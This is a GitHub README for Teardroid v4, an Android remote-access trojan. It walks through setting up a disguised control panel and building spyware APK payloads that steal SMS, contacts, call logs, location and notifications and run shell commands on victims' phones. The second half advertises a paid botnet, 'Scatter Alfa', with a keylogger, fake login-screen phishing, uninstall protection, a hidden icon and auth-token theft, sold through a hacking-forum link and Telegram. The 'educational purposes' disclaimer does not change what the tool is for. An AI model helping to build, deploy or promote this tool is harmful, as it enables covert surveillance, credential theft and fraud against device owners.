### :warning:Disclaimer : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.

# :robot: Teardroid v4

![Screenshot](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/IMG-20220122-WA0000_RdKN5Rv3U.jpg)

🇮🇳 It's easy to use android botnet work without port forwarding, vps and android studio

[![GitHub issues](https://img.shields.io/github/issues/ScRiPt1337/Teardroid-phprat)](https://github.com/ScRiPt1337/Teardroid-phprat/issues)
[![Twitter](https://img.shields.io/twitter/url?style=social&url=https%3A%2F%2Ftwitter.com%2Fhacksec42)](https://twitter.com/intent/tweet?text=Wow:&url=https://github.com/ScRiPt1337/Teardroid-phprat/)
[![Hacksec](https://img.shields.io/badge/Teardroid-4.0-red)](https://github.com/ScRiPt1337/Teardroid-phprat/)

### :rocket: Features

- Retrieve Contact
- Retrieve SMS
- Retrieve running Services
- Retrieve Device Location (:worried: Only work when the app is open on newer devices)
- Retrieve Call Logs
- Run Shell Command ( use findphno command in run shell command to get device phone number and use findx:pdf to find all the pdf files on the device )
- Change Wallpaper
- Send SMS
- Make Call
- Get Installed Apps
- Download File
- Read Notification
- Auto-Start
- Add webview in homepage
- Ignore Battery Optimisation
- Change icon
- ~~Get device admin permission~~

### :warning: Requirement

- Python3
- Java
- Linux or Windows os (we don't support termux use gcloud)
- For android mobile users use github Codespaces

### Java version i used

```bash
$ java -version
openjdk version "11.0.13" 2021-10-19
OpenJDK Runtime Environment (build 11.0.13+8)
OpenJDK 64-Bit Server VM (build 11.0.13+8, mixed mode)
```

### Tested on

- Windows 11
- Windows 10
- Manjaro
- Kali linux
- Ubuntu

### Run control panel on deta.space ( recommended for less technical users )
- To get started on https://deta.space, a powerful web application building platform, the first step is to create an account on their website. Once you have successfully signed up and logged in, follow these steps to access the Teardroid v4 control panel app:
- In the same window, open the URL https://deta.space/discovery/r/yz9prb9jw7ku6atg. This link will take you to the HelloKitty app installation page.
- Click the "Install" button to begin the installation process. Wait for the installation to complete and then click on the "Canvas" button.
- You will be taken to the deta.space homepage. Click on the HelloKitty app, which can be found in your panel.
- Initially, the app will display pictures of cats. However, to access the app's login panel, simply add "/v4" to the end of the URL.

By following these steps, you will be able to take full advantage of deta.space's powerful web application building tools and access the HelloKitty app's login panel.


### Run control panel on your own server ( for advanced users )

- Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below

```bash
$ git clone https://github.com/ScRiPt1337/Teardroidv4_api
```

- Install uvicorn

```bash
$ sudo apt-get install uvicorn
$ python3 -m pip install uvicorn
```

- Change dir to Teardroidv4_api

```bash
$ cd Teardroidv4_api
```

- Install all dependency

```bash
$ pip install -r requirements.txt
```

- change project key to connect with database
- Set up an account at [deta.space](https://deta.space/) and go to collections click on new collection enter a random name and click create
- once the collection is created click on project settings generate a new deta key and copy it

```bash
$ nano ./db/database.py
from deta import Deta
from os import getenv

deta = Deta(getenv("DETA_PROJECT_KEY")) => deta =  Deta("demo project key")
# replace getenv("DETA_PROJECT_KEY") with your deta.sh project key
# make sure your remove getenv
```

- open config.py and change the value of "hello" to any user_agent or text you want
- Run teardroid api

```bash
$ screen
# press enter to go inside the screen session
$ uvicorn main:app --host 0.0.0.0 --port 80
# now close your terminal windows  and we are good to go
```

- Change your user-agent of the browser with the value of USER_AGENT you have enter in config.py
- you can use this chrome extension to change user useragent [extension](https://chrome.google.com/webstore/detail/custom-useragent-string/lejiafennghcpgmbpiodgofeklkpahoe)
- Done

### IMPORTANT NOTICE

- if your hosting it on your own server you will not be able to access the dashboard if you dont change your user-agent with the same value of USER_AGENT inside config.py file.
- its to make you the dashboard more secure and to protect it.

### How to setup the builder ( generate apk payload )

- Clone Teardroid-phprat repo with the following command.

```bash
$ git clone https://github.com/ScRiPt1337/Teardroid-phprat
```

- cd in the Teardroid-phprat directory, then type the command below to install all dependencies

```bash
$ pip install -r requirements.txt
```

- Run the following command to see the options that we can use with the builder.

```bash
$ python Teardroid.py
[+] Checking Python Version
[+] Python Version : 3.10 ✓
  ______                    __           _     __         __ __
 /_  __/__  ____ __________/ /________  (_)___/ /  _   __/ // /
  / / / _ \/ __ `/ ___/ __  / ___/ __ \/ / __  /  | | / / // /_
 / / /  __/ /_/ / /  / /_/ / /  / /_/ / / /_/ /   | |/ /__  __/
/_/  \___/\__,_/_/   \__,_/_/   \____/_/\__,_/    |___/  /_/


Teardroid v4.0 - A tool to build teardroid spyware for Android devices. 🕷
Contact us : https://t.me/script1337 🚀
usage: Teardroid.py [-h] [-v] [-b]

options:
  -h, --help     show this help message and exit
  -v, --version  Version of Teardroid 🥴
  -b , --build   Build Teardroid with custom name [ex: Teardroid.py -b teardroid] 😷
```

- To create an apk execute the following command.

```bash
$ python Teardroid.py -b your_app_name
```

- It will prompt you with your Control Panel url enter your deta space control panel url without /v4 or your own server url (without / at the end of the url).
- You will also be prompted for the title and text of the notification. Enter what you want to display on the notification.
- then it ask you to enter the icon folder path so enter the icon folder path
- DONE

- ![Build using codespace](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/625b8abb-089b-4896-98c9-43dc28ab740b.gif)

### Dashboard

- visit : https://{your server url}/v4/overview
- defualt username/password is : admin/admin

### IMPORTANT NOTICE

- use your own keystore its not recommended to use the defualt keystore you can modify the values in Config.py file to use your own keystore with teardroid v4.

### Screenshot

- ![Builder](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/Builder_3oDdS0Tr7.png)

- ![Overview](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/2022-01-27_22-29_gYkI6tIvGmG.png)

- ![TaskManager](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/2022-01-27_22-49_RakvqeLWG.jpeg)

### Setup Video

- video : [setup control panel and build apk using browser only](https://www.youtube.com/watch?v=GEN3GfbHPP0)

### Need something more advanced try ( scatter alfa )

[!["Logo"](https://external-content.duckduckgo.com/iu/?u=https://i.ibb.co/7kXYDks/20221028-233129-0000.png)](https://breached.vc/Thread-Selling-SCATTER-ALFA-ANDROID-BOTNET)

##### SUPPORT ALL THE LATEST VERSION OF ANDROID

##### STEALTHY, RESILIENT AND COST-EFFECTIVE

##### SAND-BOX AND EMULATOR DETECTION

##### ADVANCED ATTACK TECHNIQUES

##### UNKILLABLE AND UNINSTALLABLE APK

##### INBUILT GEO FENCING

##### STABLE APK AND CONNECTION

##### VNC

##### O NETWORK TRAFFIC IN IDLE MODE

### Dashboard

!["scatter"](https://external-content.duckduckgo.com/iu/?u=https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/scatter.png)

!["dashboard"](https://external-content.duckduckgo.com/iu/?u=https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/dashboard.png)

### Special features

- Forground service bypass scatter does not show any notification while running in background.
- Auto launch bypass even in Chinese phone like redmi oppo vivo without auto launch permission.
- Does not create network logs and does not make http request in idle mode..
- Android battery optimization bypass without any permission.

### Features

- Keylogger ( capture everything client type on there keyboard )
- logs (log everything user click on)
- notification capture ( capture all the notification client recive )
- run ussd code ( run ussd code for call forwarding etc )
- fake notification attack ( send phishing link using fake notification that look like is from facebook, microsoft etc )
- injection ( add injection dynamically according to the installed apps on the client device )
- popup fake login screen ( popup any page on clients home page without url bar or title bar (so the client will think its from google or any other app))
- geo fencing
- dump sms, calls, contacts, installed apps
- download file
- shell command
- open url ( open any url on browser )
- open apps ( open any app on client device using there package name )
- auto allow permission ( automatically grant all the run time permission )
- uninstall protection (stop the victim from uninstalling the app or force stop the app)
- vnc
- take screenshot
- automatically take screenshot when user open any specific app ( example: if you set it to whatsapp it will take screenshot of the client's whatsapp whenever client will open whatsapp and click anything like opening convo or clicking on the send button )
- block number ( you can block number from victim device so the number can't call the victim )
- install any apk file in victim device
- uninstall any app from victim device
- wake up device and able to run for 1 to 3 hour with screen off
- hidden app icon (work on new android versions too tested on 9 to 13)
- read screen (it can be used to steal google auth token and etc)

#### Interested in scatter alfa
- You can buy it from => https://scatter.sellup.io/
- Demo video available on my telegram channel => https://t.me/scatter1337
- Pm me on telegram https://t.me/script1337

### Beware from scam

- for paid project contact me on telegram
- I am only available on telegram and script1337 is my only account please double check the username

### Contact info

- Telegram : https://t.me/script1337
